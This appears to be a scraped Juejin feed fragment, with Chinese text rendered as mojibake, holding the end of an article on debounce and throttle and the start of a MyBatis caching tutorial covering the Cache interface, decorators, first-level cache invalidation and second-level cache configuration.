<table><thead><tr><th>åœºæ™¯</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>æœç´¢æ¡†å»ºè®®</strong></td><td>ç”¨æˆ·è¾“å…¥æ—¶å»¶è¿Ÿè¯·æ±‚ï¼Œç­‰è¾“å…¥ç¨³å®šåå†æŸ¥</td></tr><tr><td><strong>çª—å£ resize</strong></td><td>é˜²æ­¢è°ƒæ•´çª—å£å¤§å°æ—¶é¢‘ç¹è§¦å‘å¸ƒå±€è®¡ç®—</td></tr><tr><td><strong>è¡¨å•æäº¤</strong></td><td>é˜²æ­¢ç”¨æˆ·ç‹‚ç‚¹â€œæäº¤â€æŒ‰é’®å¯¼è‡´é‡å¤æäº¤</td></tr><tr><td><strong>æŒ‰é’®ç‚¹å‡»</strong></td><td>å¦‚â€œç‚¹èµâ€åŠŸèƒ½ï¼Œé¿å…å¿«é€Ÿè¿ç‚¹</td></tr></tbody></table>
<blockquote>
<p>âš ï¸ æ³¨æ„ï¼š<strong>æ»šåŠ¨åŠ è½½ï¼ˆscrollï¼‰æ›´é€‚åˆç”¨èŠ‚æµï¼ˆThrottleï¼‰</strong> ï¼Œå› ä¸ºç”¨æˆ·æŒç»­æ»šåŠ¨æ—¶ä»éœ€å®šæœŸè§¦å‘ï¼ˆå¦‚æ¯ 200ms æ£€æŸ¥æ˜¯å¦åˆ°åº•éƒ¨ï¼‰ï¼Œè€Œé˜²æŠ–ä¼šåœ¨æ»šåŠ¨ç»“æŸæ‰è§¦å‘ï¼Œå¯èƒ½é”™è¿‡åŠ è½½æ—¶æœºã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-9">å…­ã€æ€»ç»“ï¼šé˜²æŠ–æ˜¯å‰ç«¯æ€§èƒ½ä¼˜åŒ–çš„åŸºçŸ³</h2>
<p>é€šè¿‡æœ¬æ–‡çš„å¯¹æ¯”å®éªŒï¼Œæˆ‘ä»¬å¯ä»¥æ¸…æ™°çœ‹åˆ°ï¼š<strong>ä¸åŠ æ§åˆ¶çš„äº‹ä»¶ç›‘å¬æ˜¯æ€§èƒ½æ€æ‰‹ï¼Œè€Œé˜²æŠ–åˆ™æ˜¯ä¼˜é›…çš„â€œå‡é€Ÿé˜€â€</strong> ã€‚å®ƒåˆ©ç”¨é—­åŒ…ä¿å­˜çŠ¶æ€ï¼Œé€šè¿‡å®šæ—¶å™¨æ™ºèƒ½åˆå¹¶é«˜é¢‘æ“ä½œï¼Œåœ¨<strong>ä¸ç‰ºç‰²ç”¨æˆ·ä½“éªŒçš„å‰æä¸‹</strong>ï¼Œå¤§å¹…é™ä½ç³»ç»Ÿå¼€é”€ã€‚</p>
<p>åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œå»ºè®®ï¼š</p>
<ul>
<li>å¯¹Â <code>input</code>ã€<code>keyup</code>ã€<code>resize</code>Â ç­‰é«˜é¢‘äº‹ä»¶<strong>é»˜è®¤ä½¿ç”¨é˜²æŠ–æˆ–èŠ‚æµ</strong></li>
<li>ä½¿ç”¨æˆç†Ÿçš„å·¥å…·åº“ï¼ˆå¦‚ Lodash çš„Â <code>_.debounce</code>ï¼‰é¿å…æ‰‹å†™ bug</li>
<li>æ ¹æ®ä¸šåŠ¡è°ƒæ•´å»¶è¿Ÿæ—¶é—´ï¼ˆæœç´¢å»ºè®®å¸¸ç”¨ 300â€“500msï¼‰</li>
</ul>
<p>è®°ä½ï¼š<strong>å¥½çš„å‰ç«¯å·¥ç¨‹å¸ˆï¼Œä¸ä»…è¦è®©åŠŸèƒ½è·‘èµ·æ¥ï¼Œæ›´è¦è®©å®ƒè·‘å¾—ç¨³ã€è·‘å¾—å¿«ã€è·‘å¾—çœã€‚</strong> Â è€Œé˜²æŠ–ï¼Œæ­£æ˜¯ä½ å·¥å…·ç®±ä¸­ä¸å¯æˆ–ç¼ºçš„ä¸€æŠŠåˆ©å™¨ã€‚</p>
<blockquote>
<p>ğŸŒŸÂ <strong>å°æç¤º</strong>ï¼šä¸‹æ¬¡å½“ä½ çœ‹åˆ°ç™¾åº¦æœç´¢æ¡†åœ¨ä½ æ‰“å­—æ—¶ä¸æ€¥ä¸èºã€ç­‰ä½ åœæ‰‹æ‰ç»™å‡ºå»ºè®®æ—¶ï¼Œå°±çŸ¥é“â€”â€”èƒŒåä¸€å®šæœ‰é˜²æŠ–åœ¨é»˜é»˜å®ˆæŠ¤æ€§èƒ½ï¼</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MyBatisç¼“å­˜æ¨¡å—è¯¦è§£]]></title>    <link>https://juejin.cn/post/7590011643296841766</link>    <guid>https://juejin.cn/post/7590011643296841766</guid>    <pubDate>2026-01-02T08:24:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590011643296841766" data-draft-id="7590021144779653166" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MyBatisç¼“å­˜æ¨¡å—è¯¦è§£"/> <meta itemprop="keywords" content="MyBatis"/> <meta itemprop="datePublished" content="2026-01-02T08:24:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é›¨ä¸­é£˜è¡çš„è®°å¿†"/> <meta itemprop="url" content="https://juejin.cn/user/694547077666606"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MyBatisç¼“å­˜æ¨¡å—è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/694547077666606/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é›¨ä¸­é£˜è¡çš„è®°å¿†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T08:24:41.000Z" title="Fri Jan 02 2026 08:24:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æ·±å…¥å‰–æMyBatisç¼“å­˜æœºåˆ¶ï¼Œä»æ¶æ„è®¾è®¡åˆ°å®æˆ˜åº”ç”¨ï¼ŒåŠ©ä½ å…¨é¢æŒæ¡ç¼“å­˜ä¼˜åŒ–</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">ä¸€ã€åˆè¯†MyBatisç¼“å­˜</h2>
<p>åœ¨æ­£å¼å¼€å§‹ä¹‹å‰ï¼Œè®©æˆ‘ä»¬å…ˆæ¥äº†è§£MyBatisçš„æ•´ä½“æ¶æ„ã€‚MyBatisé‡‡ç”¨åˆ†å±‚è®¾è®¡ï¼Œè€Œç¼“å­˜æ¨¡å—ä½œä¸ºåŸºç¡€æ”¯æ’‘å±‚çš„æ ¸å¿ƒç»„ä»¶ï¼Œæ‰¿æ‹…ç€æå‡æŸ¥è¯¢æ€§èƒ½çš„é‡è¦ä½¿å‘½ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3bdfab9b7c014c36acedf80a93e481c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767947081&amp;x-signature=40ZpXnOHN21nwfaO0at88ZiCpc4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">ç¼“å­˜çš„ä»·å€¼ä½•åœ¨ï¼Ÿ</h2>
<p>æƒ³è±¡è¿™æ ·ä¸€ä¸ªåœºæ™¯ï¼šä½ çš„ç³»ç»Ÿæ¯ç§’éœ€è¦æŸ¥è¯¢1000æ¬¡ç”¨æˆ·ä¿¡æ¯ã€‚</p>
<p><strong>æ— ç¼“å­˜æ—¶ï¼š</strong> 1000æ¬¡æ•°æ®åº“æŸ¥è¯¢/ç§’</p>
<p><strong>æœ‰ç¼“å­˜æ—¶ï¼š</strong> 1æ¬¡æ•°æ®åº“æŸ¥è¯¢ + 999æ¬¡å†…å­˜è¯»å–/ç§’</p>
<p><strong>æ€§èƒ½æå‡ï¼š</strong> è¿‘1000å€ï¼</p>
<h2 data-id="heading-2">MyBatisçš„ä¸¤çº§é˜²çº¿</h2>
<p>MyBatisæä¾›äº†ä¸¤çº§ç¼“å­˜æœºåˆ¶ï¼Œå°±åƒåŒé‡ä¿é™©ï¼š</p>























<table><thead><tr><th>ç¼“å­˜ç±»å‹</th><th>ä½œç”¨èŒƒå›´</th><th>ç”Ÿå‘½å‘¨æœŸ</th><th>æ˜¯å¦é»˜è®¤å¼€å¯</th></tr></thead><tbody><tr><td><strong>ä¸€çº§ç¼“å­˜</strong></td><td>SqlSessionä¼šè¯</td><td>ä¸ä¼šè¯åŒç”Ÿå…±æ­»</td><td>é»˜è®¤å¼€å¯</td></tr><tr><td><strong>äºŒçº§ç¼“å­˜</strong></td><td>Mapperå‘½åç©ºé—´</td><td>åº”ç”¨çº§åˆ«ï¼Œè·¨ä¼šè¯</td><td>éœ€æ‰‹åŠ¨é…ç½®</td></tr></tbody></table>
<h2 data-id="heading-3">äºŒã€ç¼“å­˜æ¶æ„</h2>
<p>MyBatisçš„ç¼“å­˜è®¾è®¡å ªç§°æ•™ç§‘ä¹¦çº§åˆ«çš„è£…é¥°å™¨æ¨¡å¼åº”ç”¨ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51ef1c22c22a4c72aa377fb27288455c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767947081&amp;x-signature=B0B5oC%2ByBwD0%2B62R6f%2BvUW0CXHE%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">Cacheæ¥å£ï¼šç¼“å­˜çš„çµé­‚</h2>
<p>æ‰€æœ‰ç¼“å­˜å®ç°éƒ½éµå¾ªè¿™ä¸ªæ ¸å¿ƒæ¥å£ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">Cache</span> {
    <span class="hljs-function">String <span class="hljs-title">getId</span>()</span>;                          <span class="hljs-comment">// ç¼“å­˜æ ‡è¯†</span>
    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">putObject</span>(<span class="hljs-params">Object key, Object <span class="hljs-keyword">value</span></span>)</span>; <span class="hljs-comment">// å­˜å…¥ç¼“å­˜</span>
    <span class="hljs-function">Object <span class="hljs-title">getObject</span>(<span class="hljs-params">Object key</span>)</span>;             <span class="hljs-comment">// è·å–ç¼“å­˜</span>
    <span class="hljs-function">Object <span class="hljs-title">removeObject</span>(<span class="hljs-params">Object key</span>)</span>;          <span class="hljs-comment">// ç§»é™¤ç¼“å­˜</span>
    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear</span>()</span>;                            <span class="hljs-comment">// æ¸…ç©ºç¼“å­˜</span>
    <span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">getSize</span>()</span>;                           <span class="hljs-comment">// ç¼“å­˜å¤§å°</span>
    <span class="hljs-function">ReadWriteLock <span class="hljs-title">getReadWriteLock</span>()</span>;        <span class="hljs-comment">// è¯»å†™é”</span>
}
</code></pre>
<h2 data-id="heading-5">è£…é¥°å™¨å¤§å®¶æ—</h2>
<p>MyBatisé€šè¿‡è£…é¥°å™¨æ¨¡å¼ä¸ºç¼“å­˜"ç©¿è¡£æœ"ï¼Œæ¯ä¸ªè£…é¥°å™¨èµ‹äºˆç¼“å­˜ä¸€ç§æ–°èƒ½åŠ›ï¼š</p>
<h2 data-id="heading-6">è£…é¥°å™¨åŠŸèƒ½é€ŸæŸ¥è¡¨</h2>




























































<table><thead><tr><th>è£…é¥°å™¨</th><th>æ ¸å¿ƒåŠŸèƒ½</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td><strong>LruCache</strong></td><td>æœ€è¿‘æœ€å°‘ä½¿ç”¨æ·˜æ±°</td><td>çƒ­ç‚¹æ•°æ®ç¼“å­˜</td></tr><tr><td><strong>FifoCache</strong></td><td>å…ˆè¿›å…ˆå‡ºæ·˜æ±°</td><td>æ—¶åºæ•°æ®ç¼“å­˜</td></tr><tr><td><strong>SoftCache</strong></td><td>è½¯å¼•ç”¨ï¼Œå†…å­˜ç´§å¼ æ—¶å›æ”¶</td><td>å¤§å¯¹è±¡ç¼“å­˜</td></tr><tr><td><strong>WeakCache</strong></td><td>å¼±å¼•ç”¨ï¼ŒGCæ—¶å›æ”¶</td><td>å†…å­˜æ•æ„Ÿåœºæ™¯</td></tr><tr><td><strong>ScheduledCache</strong></td><td>å®šæ—¶æ¸…ç†</td><td>æ—¶æ•ˆæ€§æ•°æ®</td></tr><tr><td><strong>SerializedCache</strong></td><td>åºåˆ—åŒ–å­˜å‚¨</td><td>æ•°æ®éš”ç¦»ä¿æŠ¤</td></tr><tr><td><strong>LoggingCache</strong></td><td>æ—¥å¿—è®°å½•</td><td>æ€§èƒ½ç›‘æ§</td></tr><tr><td><strong>SynchronizedCache</strong></td><td>çº¿ç¨‹åŒæ­¥</td><td>å¹¶å‘å®‰å…¨</td></tr><tr><td><strong>BlockingCache</strong></td><td>é˜»å¡æ§åˆ¶</td><td>é˜²æ­¢å‡»ç©¿</td></tr><tr><td><strong>TransactionalCache</strong></td><td>äº‹åŠ¡ç¼“å­˜</td><td>äº‹åŠ¡ä¸€è‡´æ€§</td></tr></tbody></table>
<h2 data-id="heading-7">PerpetualCacheï¼šä¸‡ä¸ˆé«˜æ¥¼å¹³åœ°èµ·</h2>
<p>è¿™æ˜¯æœ€åŸºç¡€çš„ç¼“å­˜å®ç°ï¼Œç®€å•è€Œé«˜æ•ˆï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PerpetualCache</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Cache</span> {
    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">String</span> id;
    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">Object</span>, <span class="hljs-title class_">Object</span>&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">putObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> key, <span class="hljs-built_in">Object</span> value</span>) {
        cache.<span class="hljs-title function_">put</span>(key, value);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">getObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> key</span>) {
        <span class="hljs-keyword">return</span> cache.<span class="hljs-title function_">get</span>(key);
    }

    <span class="hljs-comment">// ... å…¶ä»–æ–¹æ³•å®ç°</span>
}
</code></pre>
<h2 data-id="heading-8">ä¸‰ã€ä¸€çº§ç¼“å­˜ï¼šä¼šè¯çš„ä¸“å±è®°å¿†</h2>
<p>ä¸€çº§ç¼“å­˜æ˜¯SqlSessionçº§åˆ«çš„ç¼“å­˜ï¼Œé»˜è®¤å¼€å¯ï¼Œæ— éœ€é…ç½®ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/05d4504e1bf44a3791858be49e68c584~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767947081&amp;x-signature=PpFKNkzToWDkbgaNCoLGhhO7frI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-9">å·¥ä½œåŸç†è§£æ</h2>
<p>ä¸€çº§ç¼“å­˜çš„æ ¸å¿ƒé€»è¾‘åœ¨BaseExecutorä¸­å®ç°ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">public &lt;E&gt; List&lt;E&gt; <span class="hljs-built_in">query</span>(MappedStatement ms, Object parameter, 
                         RowBounds rowBounds, ResultHandler resultHandler) {
    <span class="hljs-comment">//åˆ›å»ºç¼“å­˜é”®</span>
    CacheKey key = <span class="hljs-built_in">createCacheKey</span>(ms, parameter, rowBounds, boundSql);

    <span class="hljs-comment">//å…ˆæŸ¥ç¼“å­˜</span>
    List&lt;E&gt; list = (List&lt;E&gt;) localCache<span class="hljs-selector-class">.getObject</span>(key);
    if (list != null) {
        return list; <span class="hljs-comment">// ç¼“å­˜å‘½ä¸­ï¼</span>
    }

    <span class="hljs-comment">//ç¼“å­˜æœªå‘½ä¸­ï¼ŒæŸ¥è¯¢æ•°æ®åº“</span>
    list = <span class="hljs-built_in">queryFromDatabase</span>(ms, parameter, rowBounds, 
                            resultHandler, key, boundSql);

    <span class="hljs-comment">//ç»“æœå†™å…¥ç¼“å­˜</span>
    localCache<span class="hljs-selector-class">.putObject</span>(key, list);

    return list;
}
</code></pre>
<h2 data-id="heading-10">CacheKeyï¼šç¼“å­˜çš„èº«ä»½è¯</h2>
<p>CacheKeyç”±å¤šä¸ªå…ƒç´ ç»„æˆï¼Œç¡®ä¿å”¯ä¸€æ€§ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">CacheKeyçš„ç»„æˆï¼š
â”œâ”€â”€ MappedStatementçš„ID
â”œâ”€â”€ æŸ¥è¯¢å‚æ•°
â”œâ”€â”€ åˆ†é¡µä¿¡æ¯ï¼ˆRowBoundsï¼‰
â”œâ”€â”€ <span class="hljs-keyword">SQL</span>è¯­å¥
â””â”€â”€ ç¯å¢ƒID
</code></pre>
<p><strong>åˆ¤æ–­ç¼“å­˜å‘½ä¸­æ—¶ï¼Œè¿™äº›å…ƒç´ å¿…é¡»å®Œå…¨ä¸€è‡´ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">equals</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> <span class="hljs-built_in">object</span></span>) {
    final <span class="hljs-title class_">CacheKey</span> cacheKey = (<span class="hljs-title class_">CacheKey</span>) <span class="hljs-built_in">object</span>;

    <span class="hljs-keyword">return</span> hashcode == cacheKey.<span class="hljs-property">hashcode</span>      <span class="hljs-comment">// å“ˆå¸Œç ç›¸åŒ</span>
        &amp;&amp; checksum == cacheKey.<span class="hljs-property">checksum</span>      <span class="hljs-comment">// æ ¡éªŒå’Œç›¸åŒ</span>
        &amp;&amp; count == cacheKey.<span class="hljs-property">count</span>            <span class="hljs-comment">// å…ƒç´ æ•°é‡ç›¸åŒ</span>
        &amp;&amp; updateList.<span class="hljs-title function_">equals</span>(cacheKey.<span class="hljs-property">updateList</span>); <span class="hljs-comment">// å…ƒç´ åˆ—è¡¨ç›¸åŒ</span>
}
</code></pre>
<h2 data-id="heading-11">äº”ç§å¤±æ•ˆåœºæ™¯</h2>
<p>ä¸€çº§ç¼“å­˜åœ¨ä»¥ä¸‹æƒ…å†µä¼šè¢«æ¸…ç©ºï¼š</p>
<ol>
<li>æ‰§è¡Œå¢åˆ æ”¹æ“ä½œ</li>
<li>æ‰‹åŠ¨æ¸…ç©º</li>
<li>æäº¤äº‹åŠ¡</li>
<li>å›æ»šäº‹åŠ¡</li>
<li>å…³é—­ä¼šè¯</li>
</ol>

<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Override</span>
public int <span class="hljs-attribute">update</span>(MappedStatement ms, Object parameter) {
    <span class="hljs-built_in">clearLocalCache</span>(); <span class="hljs-comment">//æ¸…ç©ºç¼“å­˜</span>
    return <span class="hljs-built_in">doUpdate</span>(ms, parameter);
}
</code></pre>

<pre><code class="hljs language-scss" lang="scss">session<span class="hljs-selector-class">.clearCache</span>(); <span class="hljs-comment">//ä¸»åŠ¨æ¸…ç†</span>
</code></pre>

<pre><code class="hljs language-scss" lang="scss">session<span class="hljs-selector-class">.commit</span>(); <span class="hljs-comment">//æäº¤æ—¶æ¸…ç©º</span>
</code></pre>

<pre><code class="hljs language-scss" lang="scss">session<span class="hljs-selector-class">.rollback</span>(); <span class="hljs-comment">//å›æ»šæ—¶æ¸…ç©º</span>
</code></pre>

<pre><code class="hljs language-go" lang="go">session.<span class="hljs-built_in">close</span>(); <span class="hljs-comment">//ä¼šè¯ç»“æŸï¼Œç¼“å­˜æ¶ˆå¤±</span>
</code></pre>
<h2 data-id="heading-12">å®æˆ˜æ¼”ç¤º</h2>
<pre><code class="hljs language-ini" lang="ini">SqlSession <span class="hljs-attr">session</span> = sqlSessionFactory.openSession()<span class="hljs-comment">;</span>
UserMapper <span class="hljs-attr">mapper</span> = session.getMapper(UserMapper.class)<span class="hljs-comment">;</span>

// ç¬¬ä¸€æ¬¡æŸ¥è¯¢ - è®¿é—®æ•°æ®åº“
User <span class="hljs-attr">user1</span> = mapper.selectById(<span class="hljs-number">1</span>L)<span class="hljs-comment">;</span>
System.out.println("é¦–æ¬¡æŸ¥è¯¢: " + user1)<span class="hljs-comment">;</span>

// ç¬¬äºŒæ¬¡æŸ¥è¯¢ - ä»ç¼“å­˜è·å–
User <span class="hljs-attr">user2</span> = mapper.selectById(<span class="hljs-number">1</span>L)<span class="hljs-comment">;</span>
System.out.println("å†æ¬¡æŸ¥è¯¢: " + user2)<span class="hljs-comment">;</span>

// éªŒè¯æ˜¯å¦ä¸ºåŒä¸€å¯¹è±¡
System.out.println("åŒä¸€å¯¹è±¡? " + (<span class="hljs-attr">user1</span> == user2))<span class="hljs-comment">; //true</span>

session.close()<span class="hljs-comment">;</span>
</code></pre>
<h2 data-id="heading-13">å››ã€äºŒçº§ç¼“å­˜ï¼šè·¨ä¼šè¯çš„å…±äº«ç©ºé—´</h2>
<p>äºŒçº§ç¼“å­˜æ˜¯Mapperçº§åˆ«çš„ç¼“å­˜ï¼Œå¯ä»¥åœ¨ä¸åŒSqlSessionä¹‹é—´å…±äº«æ•°æ®ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/febc3e799e984f87a3826ee26ea18e9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767947081&amp;x-signature=%2BMi1Ot2lFyp0u3f0bQ8IlqggoRw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-14">å¼€å¯äºŒçº§ç¼“å­˜</h2>
<p>åœ¨Mapper XMLä¸­æ·»åŠ é…ç½®ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">"com.example.mapper.UserMapper"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- å¼€å¯äºŒçº§ç¼“å­˜ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">cache</span> <span class="hljs-attr">eviction</span>=<span class="hljs-string">"LRU"</span>
           <span class="hljs-attr">flushInterval</span>=<span class="hljs-string">"60000"</span>
           <span class="hljs-attr">size</span>=<span class="hljs-string">"1024"</span>
           <span class="hljs-attr">readOnly</span>=<span class="hljs-string">"true"</span>/&gt;</span>

